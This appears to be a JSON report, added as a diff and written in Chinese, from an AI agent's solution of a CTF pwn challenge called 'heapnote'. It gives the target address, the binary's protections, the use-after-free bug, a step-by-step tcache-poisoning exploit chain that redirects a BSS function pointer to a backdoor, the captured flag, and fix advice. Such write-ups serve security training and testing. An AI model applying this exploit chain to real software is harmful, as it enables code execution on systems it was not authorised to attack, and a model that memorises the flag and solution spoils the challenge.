@@ -1,0 +1,19 @@
+{
+  "name": "heapnote",
+  "difficulty": "中等",
+  "vuln_type": "Pwn / 堆 UAF + tcache poisoning（safe-linking）",
+  "target": "219.216.64.241:36041（附件：attachments/pwn + libc.so.6 + ld-linux）",
+  "elapsed": "0 日 0 时 1 分 10 秒",
+  "llm": "deepseek-flash",
+  "flag": "nex{HeApn07e_t50p6zr4}",
+  "scope": "仅用户给定的 219.216.64.241:36041；只把 backdoor 地址写进靶机 BSS 并触发一次，未留文件/未横向",
+  "fingerprint": "ELF64 amd64，非 PIE（0x3fe000）、canary、NX、Full RELRO；菜单 `1. add / 2. delete / 3. edit / 4. show / 5. call / 6. exit`；符号 `backdoor@0x4011fe`（内部 `cat ./flag`）；`call` 跳到 BSS 上的函数指针 **0x404040**（默认指向 \"this is the default handler. nothing here.\"）",
+  "surface": "1) add(idx,size,data) 分配 0x40 块 2) delete(idx) 释放后**不置空**（UAF/double-free）3) show(idx) 可读 freed chunk 的 fd 4) edit(idx) 可写 freed chunk 5) call 调用 0x404040 的函数指针",
+  "location": "delete 后的 UAF（show/edit 仍可访问 freed chunk）+ tcache 链表指针可控",
+  "evidence": "evidence/step1_*、step2_*（两次 heap key 不同：0x25e3e / 0x377ad，编辑后的 encoded_fp 不同，均回显同一 flag）；stepN_output.txt 里 `> nex{...}` 为 call 触发 backdoor 的原始输出",
+  "false_positive": "两次运行 heap key 不同（ASLR/堆布局变化）仍成功，排除硬编码；泄露值 = chunk>>12（safe-linking 且 next=NULL 时的编码 fd），encoded_fp = 0x404040 ^ key 与输出一致；不需要 libc 泄露（target 在非 PIE 的 BSS）；flag 由 backdoor 的 `cat ./flag` 回显，不是猜的",
+  "chain": "add(0, 0x40, \"A\"*0x40)\ndelete(0)                     # chunk 进 tcache[0x40]，fd = chunk>>12（next=NULL 的 safe-linking 编码）\nshow(0) -> 读 8 字节 fd -> key = chunk>>12\nedit(0, p64(0x404040 ^ key) + 0*56)   # tcache 下个指针改成 call 用的函数指针\nadd(1, 0x40, \"B\"*0x40)        # 消费原 chunk，tcache head = 0x404040\nadd(2, 0x40, p64(0x4011fe) + 0*56)    # malloc 返回 0x404040，写入 backdoor 地址\ncall(5) -> *(0x404040)() -> backdoor -> cat ./flag -> nex{HeApn07e_t50p6zr4}",
+  "impact": "攻击者可控制 BSS 上的函数指针并在程序内触发调用，等价于任意代码执行（本题直接跳到 backdoor 读 flag）",
+  "fix": "delete 后把指针置 NULL 并校验 idx/已释放状态；禁止对 freed chunk 的 show/edit；升级 glibc（safe-linking 只保护链表不是 UAF）；不要把可写函数指针放在固定 BSS 地址，调用前校验范围；加堆一致性检查",
+  "retro": "free 后未置空：show 读 fd 拿 heap key，tcache 下个指针改成 0x404040，第二次 add 落 backdoor，call 出 flag。"
+}
